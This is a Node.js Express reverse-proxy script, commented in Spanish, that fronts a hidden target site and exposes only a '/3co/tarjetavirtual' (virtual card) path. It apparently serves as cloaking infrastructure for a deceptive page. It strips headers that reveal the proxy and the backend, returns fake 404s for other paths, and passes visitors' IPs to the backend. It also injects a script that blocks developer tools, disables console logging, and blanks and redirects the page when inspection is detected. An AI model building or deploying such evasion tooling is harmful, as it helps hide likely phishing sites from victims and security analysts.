const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_URL = process.env.TARGET_URL || 'https://tu-servidor-real.com';
const TARGET_HOST = (() => {
  try { return new URL(TARGET_URL).host; } catch { return ''; }
})();
const ALLOWED_PATHS = ['/3co', '/3co/tarjetavirtual'];

// Prefijos estáticos permitidos (ampliados)
const STATIC_PREFIXES = [
  '/assets', '/css', '/js', '/build', '/images', '/img', '/fonts', '/storage', '/favicon.ico'
];

// Control por variable de entorno para inyección anti-inspect
// ANTI_INSPECT = 'off' | '0' | 'false'  => desactiva la inyección
const ANTI_INSPECT_ENABLED = !['off', '0', 'false'].includes(String(process.env.ANTI_INSPECT || '').toLowerCase());

// Seguridad adicional
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}));

// Eliminar headers que revelan información
app.use((req, res, next) => {
  res.removeHeader('X-Powered-By');
  res.removeHeader('Server');
  next();
});

// Función para reescribir/ajustar contenido HTML
// injectScript: true => inyecta anti-inspect; false => NO lo inyecta
const obfuscateContent = (content, contentType, injectScript) => {
  if (!contentType || !contentType.includes('text/html')) return content;

  let modified = content.toString('utf8');

  // 1) Reescribir URLs absolutas del host destino a rutas relativas
  if (TARGET_HOST) {
    const hostEsc = TARGET_HOST.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const absUrlRegex = new RegExp(`https?:\\/\\/${hostEsc}([^"')\\s]*)`, 'gi');
    modified = modified.replace(absUrlRegex, (_m, p1) => p1.startsWith('/') ? p1 : `/${p1}`);
  }

  // 2) Mantener otras URLs (CDNs externas) sin tocar.

  // 3) Inyectar script anti-inspect si corresponde
  if (injectScript && modified.includes('</body>')) {
    const antiInspectScript = `
    <script>
    (function(){
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if(e.keyCode === 123 ||
              (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
              (e.ctrlKey && e.keyCode === 85)) {
                e.preventDefault();
                return false;
            }
        });
        let devtools = {open: false};
        setInterval(() => {
            if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
                if(!devtools.open) {
                    devtools.open = true;
                    document.body.innerHTML = '';
                    window.location.href = '/3co';
                }
            } else {
                devtools.open = false;
            }
        }, 500);
        try {
          Object.defineProperty(console, 'log', { value: function(){}, writable: false, configurable: false });
        } catch(_) {}
    })();
    </script>
    `;
    modified = modified.replace('</body>', antiInspectScript + '</body>');
  }

  return Buffer.from(modified);
};

// Middleware para verificar rutas permitidas
app.use((req, res, next) => {
  const path = req.path;

  const isAllowedBase = ALLOWED_PATHS.some(allowedPath =>
    path === allowedPath || path.startsWith(allowedPath + '/')
  );

  const isStatic = STATIC_PREFIXES.some(prefix =>
    path === prefix || path.startsWith(prefix + '/')
  );

  if (!isAllowedBase && !isStatic) {
    res.status(404).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>404 Not Found</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              h1 { color: #333; }
          </style>
      </head>
      <body>
          <h1>404 - Page Not Found</h1>
          <p>The requested resource could not be found.</p>
      </body>
      </html>
    `);
    return;
  }
  next();
});

// Helper para detectar móvil (User-Agent)
const isMobileUA = (ua = '') =>
  /Android|iPhone|iPad|iPod|IEMobile|Opera Mini|Mobile|BlackBerry/i.test(ua);

// Configuración del proxy
const proxyOptions = {
  target: TARGET_URL,
  changeOrigin: true,
  secure: true,
  followRedirects: true,

  // Modificar request
  onProxyReq: (proxyReq, req, res) => {
    const userDomain = req.get('host') || 'unknown.onrender.com';
    const userIp = req.headers['x-forwarded-for'] ||
                   req.headers['x-real-ip'] ||
                   req.connection.remoteAddress ||
                   'unknown';

    proxyReq.setHeader('user_domain', userDomain);
    proxyReq.setHeader('user_ip', String(userIp).split(',')[0].trim());

    // Eliminar headers que pueden revelar el proxy
    proxyReq.removeHeader('x-forwarded-for');
    proxyReq.removeHeader('x-forwarded-host');
    proxyReq.removeHeader('x-forwarded-proto');

    // Headers tipo navegador
    proxyReq.setHeader('User-Agent', req.get('User-Agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    proxyReq.setHeader('Accept-Language', 'es-ES,es;q=0.9,en;q=0.8');

    // No solicitar compresión (evita desincronización al reescribir HTML)
    proxyReq.setHeader('Accept-Encoding', 'identity');

    // ID de sesión
    const sessionId = crypto.randomBytes(16).toString('hex');
    proxyReq.setHeader('X-Session-Id', sessionId);
  },

  // Modificar response
  onProxyRes: (proxyRes, req, res) => {
    // Quitar headers que revelan información
    delete proxyRes.headers['x-powered-by'];
    delete proxyRes.headers['server'];
    delete proxyRes.headers['x-aspnet-version'];
    delete proxyRes.headers['x-aspnetmvc-version'];
    delete proxyRes.headers['x-frame-options'];

    // Si reescribimos cuerpo, no debe haber content-encoding
    delete proxyRes.headers['content-encoding'];

    // Headers de seguridad
    proxyRes.headers['X-Content-Type-Options'] = 'nosniff';
    proxyRes.headers['X-XSS-Protection'] = '1; mode=block';
    proxyRes.headers['Referrer-Policy'] = 'no-referrer';
    proxyRes.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, private';

    // Modificación del contenido HTML
    const contentType = proxyRes.headers['content-type'];
    if (contentType && contentType.includes('text/html')) {
      const originalWrite = res.write;
      const originalEnd = res.end;
      const chunks = [];

      res.write = function(chunk) {
        chunks.push(Buffer.from(chunk));
        return true;
      };

      res.end = function(chunk) {
        if (chunk) chunks.push(Buffer.from(chunk));
        const body = Buffer.concat(chunks);

        const ua = req.get('User-Agent') || '';
        // Inyectar solo si está habilitado por env y NO es móvil
        const injectScript = ANTI_INSPECT_ENABLED && !isMobileUA(ua);

        const modifiedBody = obfuscateContent(body, contentType, injectScript);

        // Ajustar longitudes y transferencia
        proxyRes.headers['content-length'] = Buffer.byteLength(modifiedBody);
        delete proxyRes.headers['transfer-encoding'];

        res.write = originalWrite;
        res.end = originalEnd;
        res.end(modifiedBody);
      };
    }
  },

  // Manejo de errores
  onError: (err, req, res) => {
    console.error('Proxy error:', err.message);
    res.status(502).send(`
      <!DOCTYPE html>
      <html>
      <head>
          <title>Service Temporarily Unavailable</title>
          <style>
              body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
              h1 { color: #333; }
          </style>
      </head>
      <body>
          <h1>Service Temporarily Unavailable</h1>
          <p>Please try again later.</p>
      </body>
      </html>
    `);
  }
};

// Aplicar el proxy
app.use('/', createProxyMiddleware(proxyOptions));

// Manejo de errores global
app.use((err, req, res, next) => {
  console.error('Application error:', err);
  res.status(500).send('Internal Server Error');
});

app.listen(PORT, () => {
  console.log(`Proxy server running on port ${PORT}`);
  console.log('Allowed paths:', ALLOWED_PATHS.join(', '));
  console.log('Static prefixes:', STATIC_PREFIXES.join(', '));
  console.log(`Anti-inspect enabled: ${ANTI_INSPECT_ENABLED}`);
});
